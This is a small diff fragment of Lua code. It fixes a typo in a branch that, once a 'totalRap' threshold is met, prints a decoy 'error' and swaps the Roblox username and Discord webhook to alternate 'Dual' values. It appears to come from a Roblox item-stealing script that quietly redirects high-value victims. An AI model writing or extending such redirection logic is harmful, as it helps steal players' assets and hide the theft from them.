@@ -748,7 +748,7 @@ end
 
 if totalRap >= DualRap then
  print("error")
- Roblox_Username = DualUsee
+ Roblox_Username = DualUser
  Discord_Webhook = DualWebhook
 end
 
